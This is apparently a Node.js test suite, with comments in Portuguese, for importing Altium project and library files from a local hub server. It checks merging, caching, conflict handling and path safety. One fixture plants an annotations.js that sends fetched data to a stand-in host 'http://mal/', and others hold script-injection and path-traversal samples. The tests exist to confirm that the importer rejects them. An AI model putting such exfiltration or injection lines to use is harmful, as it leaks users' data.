'use strict';
// Importacao contra um hub DE VERDADE: o hubserver.py do pacote (build/hub), no Python do
// app (build/python), servindo uma pasta temporaria no papel do 192.168.15.192. ETag, 304,
// Last-Modified e o 404 de pasta sao os do Flask, nao uma imitacao.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { Backend } = require('../lib/backend');
const workspace = require('../lib/workspace');
const importer = require('../lib/import-server');

const APP = path.resolve(__dirname, '..');
const PYTHON = path.join(APP, 'build', 'python', 'python.exe');
const BUNDLE = path.join(APP, 'build', 'hub');
const PRONTO = fs.existsSync(PYTHON) && fs.existsSync(path.join(BUNDLE, 'altiumhub-manifest.json'));

function tmp(p) { return fs.mkdtempSync(path.join(os.tmpdir(), p)); }
function escreve(ws, rel, txt) {
  const f = path.join(ws, ...rel.split('/'));
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, txt);
  return f;
}
const ler = (ws, rel) => fs.readFileSync(path.join(ws, ...rel.split('/')), 'utf8');

test('importar do servidor: tres vias, 304, conflitos e ajustes locais', { skip: !PRONTO && 'rode npm run build:prep antes' }, async (t) => {
  // ── o "servidor" ──
  const srv = tmp('ahsrv-');
  workspace.sync(srv, BUNDLE);
  const P = 'Projects/PAEL-DI261940';
  escreve(srv, `${P}/board.js`, 'var pcbmirror = {"components":[],"nets":[],"tracks":[],"vias":[]};');
  escreve(srv, `${P}/schematic.js`, 'var schematic = {"items":[]};');
  escreve(srv, `${P}/changes.js`, 'var changes = [];');
  escreve(srv, `${P}/annotations.js`, 'var annotations = [];');
  escreve(srv, `${P}/apply-report.txt`, 'ok');
  escreve(srv, `${P}/bom-vistos.json`, '{"R1":true}');           // bancada do servidor: nao vem
  escreve(srv, `${P}/odoo-lista.json`, '{"estado":"recebida"}');  // recibo do envio: bancada tambem
  // os componentes fora do esquema: parte da lista do Odoo, viajam com o projeto
  const EXTRAS_SRV = '{"format":"lista-extras-v1","proximo":2,"itens":[{"id":1,"sym":"DISSIPADOR","comment":"","footprint":"","params":"","quantidade":4}]}';
  escreve(srv, `${P}/lista-extras.json`, EXTRAS_SRV);
  escreve(srv, 'Libs/lib-ledger.json', JSON.stringify({ arquivos: { 'Libs/Almox/RESISTOR ALMOX.SchLib': {} } }));
  escreve(srv, 'Libs/Almox/RESISTOR ALMOX.SchLib', Buffer.alloc(200000, 7));
  escreve(srv, 'Libs/Almox/RESISTOR ALMOX.LibPkg', 'pkg');
  escreve(srv, 'Libs/Almox/ALMOX.DbLib', '[DatabaseLinks]\r\nConnectionString=Driver={SQLite3 ODBC Driver};Database=\\\\192.168.15.192\\altiumhub\\current\\Libs\\Almox\\almox.sqlite;\r\n');
  escreve(srv, 'Libs/almox-index.js', 'var almoxIndex = {"odooUrl":"http://127.0.0.1:8070","libs":[]};');
  escreve(srv, 'Libs/almox-parts.json', '{"familias":{"RES":1}}');
  const hub = new Backend({ python: PYTHON, workspace: srv, logDir: tmp('ahlog-') });
  await hub.start({ port: 18350, lan: false });
  t.after(() => hub.stop());
  // localhost, e nao 127.0.0.1: assim da para ver o loopback do almox-index virar o host
  const serverUrl = `http://localhost:${hub.port}`;

  assert.deepStrictEqual(await importer.testar(serverUrl), { ok: true, projetos: 1 });

  // ── a maquina local, recem-instalada ──
  const ws = tmp('ahloc-');
  workspace.sync(ws, BUNDLE);
  const m = workspace.lerManifesto(BUNDLE);
  const seedHashes = Object.fromEntries(m.seed.map((e) => [e.p, e.sha1]));
  const imp = (grupos) => importer.importar({ ws, serverUrl, grupos, seedHashes });

  let r = await imp();
  assert.deepStrictEqual(r.erros, []);
  assert.strictEqual(ler(ws, `${P}/changes.js`), 'var changes = [];');
  assert.ok(!fs.existsSync(path.join(ws, P, 'bom-vistos.json')), 'vistos da bancada do servidor nao vem');
  assert.ok(!fs.existsSync(path.join(ws, P, 'odoo-lista.json')), 'o recibo do envio e da bancada do servidor');
  assert.strictEqual(ler(ws, `${P}/lista-extras.json`), EXTRAS_SRV,
    'sem os extras o desktop mandaria ao Odoo a mesma revisao sem as pecas avulsas');
  assert.ok(r.atualizados.includes('Libs/lib-ledger.json'), 'estado semeado do git e trocado pelo do servidor');
  assert.strictEqual(fs.statSync(path.join(ws, 'Libs/Almox/RESISTOR ALMOX.SchLib')).size, 200000, 'lib do almoxarifado da lista do ledger');
  assert.ok(fs.existsSync(path.join(ws, 'Libs/Almox/RESISTOR ALMOX.LibPkg')), 'o .LibPkg vem junto');
  const dblib = ler(ws, 'Libs/Almox/ALMOX.DbLib');
  assert.ok(dblib.includes(`Database=${path.join(ws, 'Libs', 'Almox', 'almox.sqlite')};`), 'DbLib aponta o SQLite local: ' + dblib);
  assert.ok(!dblib.includes('192.168.15.192'));
  assert.ok(ler(ws, 'Libs/almox-index.js').includes('"odooUrl":"http://localhost:8070"'), 'loopback do servidor vira o host dele');
  // data do servidor, e nao a da copia: o hub decide "pendente" comparando mtimes
  const dt = Math.abs(fs.statSync(path.join(ws, P, 'changes.js')).mtimeMs - fs.statSync(path.join(srv, P, 'changes.js')).mtimeMs);
  assert.ok(dt < 2000, 'mtime veio do Last-Modified (diferenca ' + dt + ' ms)');

  // ── segunda importacao, nada mudou: tudo 304 ──
  r = await imp();
  assert.strictEqual(r.novos.length + r.atualizados.length, 0, JSON.stringify(r));
  assert.strictEqual(r.bytes, 0, 'nada baixado: o ETag fez o servidor responder 304');

  // ── so o local mudou / so o servidor mudou / os dois mudaram ──
  escreve(ws, `${P}/changes.js`, 'var changes = [{"op":"via_add"}];');           // local
  escreve(srv, `${P}/schematic.js`, 'var schematic = {"items":[1]};');            // servidor
  escreve(ws, `${P}/annotations.js`, 'var annotations = ["local"];');             // os dois
  escreve(srv, `${P}/annotations.js`, 'var annotations = ["servidor"];');
  escreve(ws, `${P}/lista-extras.json`, '{"itens":["local"]}');                  // os dois, extras
  escreve(srv, `${P}/lista-extras.json`, '{"itens":["servidor"]}');
  escreve(ws, 'Libs/almox-parts.json', '{"familias":{"RES":1,"LOCAL":2}}');       // os dois, almox
  escreve(srv, 'Libs/almox-parts.json', '{"familias":{"RES":1,"SERV":3}}');
  r = await imp();
  assert.strictEqual(ler(ws, `${P}/changes.js`), 'var changes = [{"op":"via_add"}];', 'mudanca so local fica');
  assert.ok(r.mantidos.includes(`${P}/changes.js`));
  assert.strictEqual(ler(ws, `${P}/schematic.js`), 'var schematic = {"items":[1]};', 'mudanca so do servidor vem');
  assert.strictEqual(ler(ws, `${P}/annotations.js`), 'var annotations = ["local"];', 'conflito de projeto: fica o local');
  assert.ok(r.conflitos.includes(`${P}/annotations.js`));
  assert.strictEqual(ler(ws, `${P}/lista-extras.json`), '{"itens":["local"]}', 'extras em conflito: fica o local');
  assert.ok(r.conflitos.includes(`${P}/lista-extras.json`));
  assert.strictEqual(fs.readFileSync(path.join(r.pastaConflitos, ...`${P}/lista-extras.json`.split('/')), 'utf8'),
    '{"itens":["servidor"]}', 'e os extras do servidor ficam guardados a parte');
  assert.strictEqual(fs.readFileSync(path.join(r.pastaConflitos, ...`${P}/annotations.js`.split('/')), 'utf8'),
    'var annotations = ["servidor"];', 'a versao do servidor fica guardada a parte');
  assert.strictEqual(ler(ws, 'Libs/almox-parts.json'), '{"familias":{"RES":1,"SERV":3}}', 'livro-razao: o servidor vence');
  assert.strictEqual(fs.readFileSync(path.join(r.pastaBackup, 'Libs', 'almox-parts.json'), 'utf8'),
    '{"familias":{"RES":1,"LOCAL":2}}', 'e o local vai para o backup');

  // ── so o grupo do almoxarifado (o que roda antes de cada sincronismo) ──
  escreve(srv, 'Libs/lib-ledger.json', JSON.stringify({ arquivos: { 'Libs/Almox/RESISTOR ALMOX.SchLib': {} }, v: 2 }));
  escreve(srv, `${P}/schematic.js`, 'var schematic = {"items":[2]};');
  r = await imp(['almox']);
  assert.ok(r.atualizados.includes('Libs/lib-ledger.json'));
  assert.strictEqual(ler(ws, `${P}/schematic.js`), 'var schematic = {"items":[1]};', 'grupo almox nao mexe em projeto');
  assert.ok(importer.ultimaImportacao(ws));
});

test('um arquivo que nao grava custa um arquivo; codigo no .js do servidor e recusado; "$" no caminho', { skip: !PRONTO && 'rode npm run build:prep antes' }, async (t) => {
  const srv = tmp('ahsrv2-');
  workspace.sync(srv, BUNDLE);
  const P = 'Projects/P2';
  escreve(srv, `${P}/board.js`, 'var pcbmirror = {"components":[],"nets":[],"tracks":[],"vias":[]};');
  escreve(srv, `${P}/changes.js`, '// comentario em linha propria\nvar changes = [\n{"op":"via_add","x":1},\n];');
  escreve(srv, `${P}/annotations.js`, 'var annotations = []; fetch("/hub-almox.json").then(r => r.text()).then(t => fetch("http://mal/" + t));');
  escreve(srv, `${P}/schematic.js`, 'var location = "javascript:alert(1)";');
  escreve(srv, 'Libs/lib-ledger.json', JSON.stringify({ arquivos: { 'Libs/Almox/X ALMOX.SchLib': {} } }));
  escreve(srv, 'Libs/Almox/X ALMOX.SchLib', 'lib');
  escreve(srv, 'Libs/Almox/ALMOX.DbLib', '[DatabaseLinks]\r\nConnectionString=Driver={SQLite3 ODBC Driver};Database=\\\\srv\\x\\almox.sqlite;\r\n');
  const hub = new Backend({ python: PYTHON, workspace: srv, logDir: tmp('ahlog2-') });
  await hub.start({ port: 18351, lan: false });
  t.after(() => hub.stop());
  const serverUrl = `http://127.0.0.1:${hub.port}`;

  const ws = path.join(tmp('ahloc2-'), 'hub$1$&x');      // "$" que um replace(string) interpretaria
  workspace.sync(ws, BUNDLE);
  // board.js nao pode ser gravado: um DIRETORIO no lugar do arquivo (rename falha sempre)
  fs.mkdirSync(path.join(ws, P, 'board.js'), { recursive: true });
  const r = await importer.importar({ ws, serverUrl, grupos: ['projetos', 'almox', 'almoxLibs'], seedHashes: workspace.seedHashes(ws, BUNDLE) });

  assert.ok(r.erros.some((e) => e.startsWith(`${P}/board.js:`)), 'a falha e reportada: ' + r.erros.join(' | '));
  assert.strictEqual(ler(ws, `${P}/changes.js`), '// comentario em linha propria\nvar changes = [\n{"op":"via_add","x":1},\n];',
    'o resto seguiu (e o formato do hub, com comentario e virgula final, passa)');
  assert.ok(fs.existsSync(path.join(ws, 'Libs/Almox/X ALMOX.SchLib')), 'e a fase de Libs/Almox rodou depois da falha');
  assert.ok(!fs.existsSync(path.join(ws, P, 'annotations.js')), 'annotations.js com codigo NAO entra');
  assert.ok(r.erros.some((e) => e.startsWith(`${P}/annotations.js: recusado`)));
  assert.ok(!fs.existsSync(path.join(ws, P, 'schematic.js')), 'var location = ... NAO entra');
  assert.ok(!fs.readdirSync(path.join(ws, P)).some((f) => f.endsWith('.altiumhub-tmp')), 'nenhum .tmp esquecido');
  assert.ok(fs.existsSync(path.join(ws, '.altiumhub', 'import-state.json')), 'o estado das tres vias foi salvo');
  const dblib = ler(ws, 'Libs/Almox/ALMOX.DbLib');
  assert.ok(dblib.includes(`Database=${path.join(ws, 'Libs', 'Almox', 'almox.sqlite')};`), 'caminho com $ entra literal: ' + dblib);
});

test('semente de uma versao ANTERIOR conta como intocada (nao vira conflito depois de atualizar o app)', { skip: !PRONTO && 'rode npm run build:prep antes' }, async (t) => {
  const srv = tmp('ahsrv3-');
  workspace.sync(srv, BUNDLE);
  escreve(srv, 'Libs/schlib.js', 'var schlib = {"symbols":["do servidor"]};');
  const hub = new Backend({ python: PYTHON, workspace: srv, logDir: tmp('ahlog3-') });
  await hub.start({ port: 18352, lan: false });
  t.after(() => hub.stop());

  // pacote "1.0.0" com um schlib.js; a pasta e semeada com ele
  const pk = tmp('ahpk-');
  const monta = (versao, schlib) => {
    fs.rmSync(pk, { recursive: true, force: true });
    const crypto = require('node:crypto');
    const sha = (x) => crypto.createHash('sha1').update(x).digest('hex');
    escreve(pk, 'hubserver.py', 'x');
    escreve(pk, 'Libs/schlib.js', schlib);
    fs.writeFileSync(path.join(pk, 'altiumhub-manifest.json'), JSON.stringify({
      format: 'altiumhub-manifest-1', appVersion: versao, commit: 'c' + versao, dirs: [],
      code: [{ p: 'hubserver.py', size: 1, sha1: sha('x') }],
      seed: [{ p: 'Libs/schlib.js', size: Buffer.byteLength(schlib), sha1: sha(schlib) }],
    }));
  };
  const ws = tmp('ahloc3-');
  monta('1.0.0', 'var schlib = {"symbols":["git 1.0.0"]};');
  workspace.sync(ws, pk);
  // o app se atualiza para "1.0.1", cujo commit mudou o schlib.js no git; a pasta nao muda
  monta('1.0.1', 'var schlib = {"symbols":["git 1.0.1"]};');
  workspace.sync(ws, pk);
  const r = await importer.importar({ ws, serverUrl: `http://127.0.0.1:${hub.port}`, grupos: ['libs'], seedHashes: workspace.seedHashes(ws, pk) });
  assert.ok(r.atualizados.includes('Libs/schlib.js'), JSON.stringify(r));
  assert.ok(!r.conflitos.includes('Libs/schlib.js'));
  assert.strictEqual(ler(ws, 'Libs/schlib.js'), 'var schlib = {"symbols":["do servidor"]};');
});

test('os componentes fora do esquema viajam com o projeto; o recibo do Odoo nao', () => {
  // o mesmo projeto e a mesma revisao montam a mesma lista na web e no desktop so se o
  // lista-extras.json vier junto: o envio do desktop usa o mesmo uid_externo e SUBSTITUI a
  // solicitacao pendente
  assert.ok(importer.ARQ_PROJETO.includes('lista-extras.json'));
  for (const bancada of ['odoo-lista.json', 'bom-vistos.json', 'bom-opts.json'])
    assert.ok(!importer.ARQ_PROJETO.includes(bancada), bancada);
});

test('relSeguro e recusaDeDado', () => {
  for (const ok of ['Projects/PAEL-DI261940/board.js', 'Projects/LM555 astável/schematic.js', 'Libs/Almox/RESISTOR 1 ALMOX.SchLib']) {
    assert.ok(importer.relSeguro(ok), ok);
  }
  for (const ruim of ['Projects/Placa: rev2/board.js', 'Projects/Proj./board.js', 'Projects/Proj /board.js', 'Projects/CON/board.js',
    'Projects/../x', 'Libs/Almox/a.SchLib:ads', 'Projects//x', 'Projects/a\\b/x']) {
    assert.ok(!importer.relSeguro(ruim), ruim);
  }
  assert.strictEqual(importer.recusaDeDado('Libs/lib-subs.js', Buffer.from('var libSubs = [];')), '');
  assert.strictEqual(importer.recusaDeDado('Libs/Almox/x.SchLib', Buffer.from('qualquer coisa')), '', 'binario nao e .js');
  assert.ok(importer.recusaDeDado('Libs/lib-subs.js', Buffer.from('var libSubs = []; alert(1)')));
  assert.ok(importer.recusaDeDado('Libs/lib-subs.js', Buffer.from('window.x = 1')));
  assert.ok(importer.recusaDeDado('Libs/lib-subs.js', Buffer.from('var top = {}')), 'nome fora da lista');
});

test('servidor fora do ar: testar diz o motivo sem travar', async () => {
  const r = await importer.testar('http://127.0.0.1:1');
  assert.strictEqual(r.ok, false);
  assert.ok(r.erro);
});
